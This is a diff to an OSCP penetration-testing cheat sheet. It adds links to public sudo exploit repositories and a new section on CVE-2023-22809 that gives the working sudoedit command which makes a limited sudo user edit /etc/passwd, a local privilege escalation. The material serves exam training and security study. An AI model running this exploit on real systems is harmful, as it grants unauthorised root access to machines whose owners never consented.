@@ -157,6 +157,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [CVE-2022-0847: Dirty Pipe LPE](https://github.com/0xsyr0/OSCP#cve-2022-0847-dirty-pipe-lpe)
 		- [CVE-2022-30190: MS-MSDT Follina RCE](https://github.com/0xsyr0/OSCP#cve-2022-30190-ms-msdt-follina-rce)
 		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](https://github.com/0xsyr0/OSCP#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
+		- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2023-22809-sudo-bypass)
 		- [Juicy Potato LPE](https://github.com/0xsyr0/OSCP#juicy-potato-lpe)
 		- [SharpEfsPotato LPE](https://github.com/0xsyr0/OSCP#sharpefspotato-lpe)
 		- [Shocker Container Escape](https://github.com/0xsyr0/OSCP#shocker-container-escape)
@@ -329,7 +330,8 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
 | CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
 | CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
-| CVE-2019-18634 | Sudo LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
+| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
+| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
 | CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
 | CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
 | CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
@@ -3937,6 +3939,31 @@ At least trigger `StorSvc` via `RpcClient.exe`.
 
 ```c
 .\RpcClient.exe
+```
+
+#### CVE-2023-22809: Sudo Bypass
+
+> https://medium.com/@dev.nest/how-to-bypass-sudo-exploit-cve-2023-22809-vulnerability-296ef10a1466
+
+##### Pre-requisites
+
+- Sudo version needs to be ≥ 1.8 and < 1.9.12p2.
+- Limited Sudo access to at least one file on the system that requires root access.
+
+##### Example
+
+```c
+test ALL=(ALL:ALL) NOPASSWD: sudoedit /etc/motd
+```
+
+##### Exploitation
+
+```c
+EDITOR="vi -- /etc/passwd" sudoedit /etc/motd
+```
+
+```c
+sudoedit /etc/motd
 ```
 
 #### Juicy Potato LPE
